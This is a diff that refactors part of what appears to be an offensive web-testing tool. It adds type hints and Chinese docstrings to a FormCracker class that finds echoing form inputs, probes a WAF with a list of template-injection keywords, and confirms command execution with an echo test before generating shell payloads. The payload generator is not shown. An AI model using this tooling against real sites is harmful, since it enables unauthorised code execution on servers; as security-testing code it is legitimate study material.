@@ -2,8 +2,9 @@ from urllib.parse import urlparse
 from collections import Counter, namedtuple
 from functools import lru_cache
 import logging
+from typing import List, Dict, Tuple, Callable, Any
 
-from . import form
+from .form import Form, random_fill, fill_form
 from .requester import Requester
 from .colorize import colored
 from .shell_payload import exec_cmd_payload
@@ -14,6 +15,9 @@ Result = namedtuple("Result", "payload_generate_func input_field")
 
 
 class FormCracker:
+    """
+    对指定的文档进行攻击
+    """
     dangerous_keywords = [
         "config", "self", "os", "class", "mro", "base", "request",
         "attr", "open", "system",
@@ -23,14 +27,34 @@ class FormCracker:
     test_cmd = "echo f3n  j1ng;"
     test_result = "f3n j1ng"
 
-    def __init__(self, form, method="POST", inputs=None, url=None, action=None, requester=None, request_interval=0):
+    def __init__(
+            self,
+            form: Dict[str, Any],
+            method: str = "POST",
+            inputs: List[str] | None = None,
+            url: str | None = None,
+            action: str | None = None,
+            requester: Requester | None = None,
+            request_interval: float = 0.0
+    ):
+        """生成用于攻击form的类
+
+        Args:
+            form (dict): 解析后的form元素
+            method (str, optional): form的提交方法. Defaults to "POST".
+            inputs (list, optional): form的输入. Defaults to None.
+            url (str, optional): form所在的url. Defaults to None.
+            action (str, optional): form的action, 为None时和url相同. Defaults to None.
+            requester (Requester, optional): 用于发出请求的requester，为None时自动构造. Defaults to None.
+            request_interval (float, optional): 请求的间隔，用于构造requester. Defaults to 0.
+        """
         self.url = url
         if form:
             self.form = form
         else:
-            assert all(param is not None for param in [method, inputs, url]), \
-                "[method, inputs, url] should not be None!"
-            self.form = form.Form(
+            assert method is not None and inputs is not None and url is not None, \
+                "[method, inputs, url] should not be None!" # for typing
+            self.form = Form(
                 method=method,
                 inputs=inputs,
                 action=action or urlparse(url)[2]
@@ -42,10 +66,15 @@ class FormCracker:
                 interval=request_interval
             )
 
-    def vulunable_inputs(self):
-        fill_dict = form.random_fill(self.form)
+    def vulunable_inputs(self) -> List[str]:
+        """解析出form中有回显的input
+
+        Returns:
+            List[str]: 所有有回显的input name
+        """
+        fill_dict = random_fill(self.form)
         r = self.req.request(
-            **form.fill_form(
+            **fill_form(
                 self.url,
                 self.form,
                 form_inputs=fill_dict))
@@ -56,18 +85,34 @@ class FormCracker:
         ]
 
     def submit(self, inputs: dict):
-        # logger.info(f"submit {inputs}")
+        """根据inputs提交form
+
+        Args:
+            inputs (dict): 需要提交的input
+
+        Returns:
+            requests.Response: 返回的reponse元素
+        """
         all_length = sum(len(v) for v in inputs.values())
         if all_length > 2048 and self.form["method"] == "GET":
             logger.warning(
                 f"inputs are extremely long (len={all_length}) that the request might fail")
         return self.req.request(
-            **form.fill_form(self.url, self.form, inputs))
+            **fill_form(self.url, self.form, inputs))
 
     def waf_page_hash(self, input_field: str):
+        """使用危险的payload测试对应的input，得到一系列响应后，求出响应中最常见的几个hash
+
+        Args:
+            input_field (str): 需要测试的input
+
+        Returns:
+            List[int]: payload被waf后页面对应的hash
+        """
         resps = {}
         for keyword in self.dangerous_keywords:
-            logger.info(f"Testing dangerous keyword {colored('yellow', repr(keyword * 3))}")
+            logger.info(
+                f"Testing dangerous keyword {colored('yellow', repr(keyword * 3))}")
             resps[keyword] = self.submit({input_field: keyword * 3})
         # resps = {
         #     keyword: self.submit({input_field: keyword * 3})
@@ -79,7 +124,15 @@ class FormCracker:
         ]
         return [pair[0] for pair in Counter(hashes).most_common(2)]
 
-    def crack_inputs(self, input_field):
+    def crack_inputs(self, input_field: str) -> Result | None:
+        """攻击对应的input
+
+        Args:
+            input_field (str): 需要攻击的input
+
+        Returns:
+            Result | None: 对应的payload生成函数，以及对应的input
+        """
         logger.info(f"Testing {colored('yellow', input_field)}")
 
         waf_hashes = self.waf_page_hash(input_field)
@@ -99,7 +152,8 @@ class FormCracker:
             r = self.submit({input_field: payload})
             assert r is not None
             if self.test_result in r.text:
-                logger.info(f"{colored('green', 'Success!')} Now we can generate payloads.")
+                logger.info(
+                    f"{colored('green', 'Success!')} Now we can generate payloads.")
             else:
                 logger.info(
                     f"{colored('yellow', 'Test Payload Failed', bold=True)}! Generated payloads might be useless.")
@@ -118,10 +172,16 @@ class FormCracker:
                 input_field=input_field
             )
 
-    def crack(self):
+    def crack(self) -> Result | None:
+        """攻击表单
+
+        Returns:
+            Result | None: 对应的payload生成函数，以及对应的input
+        """
         logger.info(f"Start cracking {self.form}")
         vulunables = self.vulunable_inputs()
-        logger.info(f"These inputs might be vulunable: {colored('yellow', repr(vulunables))}")
+        logger.info(
+            f"These inputs might be vulunable: {colored('yellow', repr(vulunables))}")
 
         for input_field in vulunables:
             result = self.crack_inputs(input_field)
